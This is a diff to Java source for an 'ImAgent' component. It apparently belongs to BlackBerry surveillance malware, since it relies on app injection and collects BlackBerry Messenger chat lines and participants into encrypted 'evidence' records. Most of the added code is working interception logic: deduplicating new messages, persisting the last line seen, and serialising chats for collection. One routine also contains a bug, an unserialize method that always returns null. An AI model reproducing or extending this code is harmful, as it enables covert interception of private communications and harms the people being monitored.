@@ -9,18 +9,26 @@
  * *************************************************/
 package blackberry.agent;
 
+import java.io.IOException;
+import java.util.Vector;
+
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.AppListener;
-import blackberry.agent.im.ImRepository;
 import blackberry.agent.im.Line;
 import blackberry.config.Conf;
+import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.Markup;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
+import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 /**
  * Instant Message.
@@ -37,7 +45,9 @@ public final class ImAgent extends Agent implements BacklightObserver,
     //boolean infected;
 
     String appName = "Messenger";
-    ImRepository imRepository;
+
+    Line lastLine;
+    Markup markup;
 
     /**
      * Instantiates a new task agents
@@ -66,10 +76,41 @@ public final class ImAgent extends Agent implements BacklightObserver,
         this(agentStatus);
         parse(confParams);
 
-        imRepository = new ImRepository();
-        
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
+
+        markup = new Markup(agentId, Encryption.getKeys().getAesKey());
+        lastLine = unserialize();
+    }
+
+    private Line unserialize() {
+        //#ifdef DEBUG
+        debug.trace("unserialize");
+        //#endif
+        if (markup.isMarkup()) {
+            try {
+                byte[] content = markup.readMarkup();
+                lastLine = Line.unserialize(content);
+                //#ifdef DEBUG
+                debug.trace("unserialize: " + lastLine);
+                //#endif
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        return null;
+    }
+
+    private void serialize(Line lastLine) {
+        //#ifdef DEBUG
+        debug.trace("serialize: " + lastLine);
+        //#endif
+        byte[] data = lastLine.serialize();
+        if (!markup.isMarkup()) {
+            markup.createEmptyMarkup();
+        }
+
+        markup.writeMarkup(data);
     }
 
     public static ImAgent getInstance() {
@@ -178,18 +219,77 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
     }
 
-    public boolean has(String partecipants, Line line) {
-        if (imRepository == null) {
-            imRepository = new ImRepository();
+    public void add(String partecipants, Vector lines) {
+        //#ifdef DEBUG
+        debug.trace("add");
+        //#endif
 
+        if (lines == null) {
+            //#ifdef DEBUG
+            debug.error("add: null lines");
+            //#endif
+            return;
         }
-        boolean alreadySaved = imRepository.has(partecipants, line);
-        return alreadySaved;
+
+        //#ifdef DBC
+        Check.asserts(lines != null, "null lines");
+        //#endif
+
+        if (lines.lastElement().equals(lastLine)) {
+            //#ifdef DEBUG
+            debug.trace("add: nothing new");
+            //#endif
+            return;
+        }
+
+        int lastEqual;
+        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
+            if (lines.elementAt(lastEqual) == lastLine) {
+                //#ifdef DEBUG
+                debug.trace("add found: " + lastEqual);
+                //#endif
+                break;
+            }
+        }
+
+        lastLine = (Line) lines.lastElement();
+        serialize(lastLine);
+        writeEvidence(partecipants, lines, lastEqual + 1);
     }
 
-    public void add(String partecipants, Line line) {
-        // TODO Auto-generated method stub
+    private void writeEvidence(String partecipants, Vector lines, int startFrom) {
+        //#ifdef DEBUG
+        debug.trace("writeEvidence");
+        //#endif
 
+        //#ifdef DBC
+        Check.requires(lines != null, "Null lines");
+        Check.requires(lines.size() > startFrom,
+                "writeEvidence wrong startFrom: " + startFrom);
+        //#endif
+
+        String imname = "BBM";
+        String topic = "chat";
+        String users = partecipants;
+
+        DateTime datetime = new DateTime();
+        evidence.createEvidence(null);
+        final Vector items = new Vector();
+
+        for (int i = startFrom; i < lines.size(); i++) {
+
+            String chatcontent = ((Line) lines.elementAt(i)).getMessage();
+
+            items.addElement(datetime.getStructTm());
+            items.addElement(WChar.getBytes(imname, true));
+            items.addElement(WChar.getBytes(topic, true));
+            items.addElement(WChar.getBytes(users, true));
+            items.addElement(WChar.getBytes(chatcontent, true));
+            items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+        }
+
+        evidence.writeEvidences(items);
+        evidence.close();
     }
 
 }
